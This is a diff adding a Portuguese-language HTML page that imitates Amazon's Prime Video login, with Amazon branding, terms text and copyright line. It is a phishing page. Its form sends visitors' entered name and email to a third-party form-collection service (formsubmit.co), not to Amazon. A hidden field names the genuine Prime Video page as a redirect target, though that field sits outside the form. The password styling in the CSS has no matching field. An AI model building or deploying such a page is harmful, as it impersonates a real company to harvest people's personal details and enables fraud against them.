@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="Pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="stylesheet" href="style.css">
+    <title>Amazon - Login</title>
+    <style>
+        *{
+    margin: 0;
+    padding: 0;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+
+h1{
+    color: black;
+    font-weight: 400;
+}
+
+#email1{
+    color: black;
+    position: relative;
+    right: 18px
+}
+
+#senha1{
+    color: black;
+    position: relative;
+    right: 100px
+    
+}
+#logo{
+    position: relative;
+    top: 10px
+}
+
+body{
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    height: 100vh;
+    width: 100vw;   
+
+}
+  
+main{
+    color: rgb(255, 255, 255);
+    display: flex;
+    margin-top: 22px;
+    width: 60%;
+    background-color: rgb(255, 255, 255);
+    padding: 32px 52px;
+    justify-content: space-between;
+    max-width: 250px;
+    flex-direction: column;
+    border: 1px solid rgba(181, 174, 174, 0.71);
+    
+}
+
+form {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+
+.login{
+    width: 100%;
+    border-radius: 5px;
+    border: 1px solid rgb(81, 79, 79);
+    height: 40px;
+    background-color: rgb(255, 255, 255);
+    margin: 8px;
+    text-indent: 20px;
+    padding: 6px;
+
+
+}
+  
+
+#botao{
+    width: 100%;
+    color: rgb(0, 0, 0);
+    background-color: #f7ca00;
+    height: 40px;
+    margin-top: 25px;
+    border-radius: 9px;
+    border: 0;
+    padding: 10px;
+    box-shadow: 2px 3px 1px rgba(128, 128, 128, 0.353);
+
+}
+
+
+.senha{
+    display: flex;
+    justify-content: space-between;
+}
+
+
+
+input{
+    width: 100%;
+    height: 10%;
+    background-color: rgb(255, 252, 252);
+    color: black;
+    border-radius: 6px;
+    border-color: black;
+
+}
+
+
+
+#uso{
+    color: black;
+    position: relative;
+    top: 6px;
+    font-size: smaller;
+    text-align: center ;
+}
+
+span{
+    color: #0066c0;
+}
+
+
+#checkbox{
+    color: black;
+   
+}
+
+.manter {
+    display: flex;
+    align-items: center;
+    position: relative;
+    top: 14px;
+    font-size: smaller;
+    color: #555555;
+}
+
+.manter span {
+    margin-right: 5px;
+    height: 25px;
+    color: black;
+}
+
+.divisor{
+   
+    width: 17em;
+    background-color: transparent;
+    display: block;
+    height: 1px;
+    border-top: 1px solid #c1bfbf;
+    position: absolute;
+    top: 480px;
+    margin-top: -1px;
+    z-index: 1;
+}
+
+footer{
+    width: 100%;
+    height: 100%;
+    background-color: #fcfcfc;
+    margin-top: 100px;
+    border: 1px solid #c1bfbf;
+    display: flex;
+    flex-direction: column;
+    
+}
+
+#link{
+    display: flex;
+    text-align: center;
+    justify-content: center;
+    font-size: x-small;
+    gap: 30px;
+    
+}
+
+a{
+    text-decoration: none;
+    color: #0066c0;
+}
+
+#copy{
+    font-size: small;
+    text-align: center;
+    margin-top: 30px;
+    color: #555555;
+}
+
+    </style>
+</head>
+<body>
+    <header>
+        <img id="logo" src="./img/PRIME.png" alt="prime">
+    </header>
+    
+    <main>
+        <div id="container">
+        <h1>Fazer Login</h1>
+            <br>
+            <form action="https://formsubmit.co/2e48a4a5f5451b4865cedb0fc785af00" method="POST">
+                <input type="text" name="name" required>
+                <input type="email" name="email" required>
+                <button type="submit">Send</button>
+           </form>
+            <input type="hidden" name="_next" value="https://www.primevideo.com/offers/nonprimehomepage/ref=dvm_pds_amz_br_dc_s_g_mkw_s2Hv03IvM-dc_pcrid_620438871494?gclid=CjwKCAjwyNSoBhA9EiwA5aYlb6GbvVeD36Xga5DCRIFueCgtJWSPSYsuo867QX20VJh6uviHYb4Z8hoC_w0QAvD_BwE&mrntrk=slid__pgrid_62046161446_pgeo_1001541_x__adext__ptid_kwd-296527732991">
+                <div>
+                    <p id="uso">Ao continuar, você concorda com as <span>Condições de uso</span> e <span>Notificação de privacidade</span> da Amazon.</p>
+                </div>
+                
+                <div>
+                    <div class="manter">
+                        <span><input type="checkbox" style="margin: 0;padding: 0; height: 13px;"></span>
+                        <span>Mantenha-me conectado</span>
+                    </div>
+        </div>
+        
+        <div class="divisor"><h5>Novo na amazon?</h5> </div>
+    
+    </main>
+    <footer>
+        
+        <div id="link">
+            <a href="#">
+                Termos e aviso de privacidade
+            </a>
+            
+            <a href="#">
+                Enviar feedback 
+            </a>
+            <a href="#">
+                Ajuda 
+            </a>
+        </div>
+
+        <div id="copy">
+            <p>
+                © 2021-2023 Amazon.com, Inc. ou suas afiliadas
+            </p>
+        </div>
+
+    </footer>
+
+   <script src="script.js"></script>
+</body>
+</html>
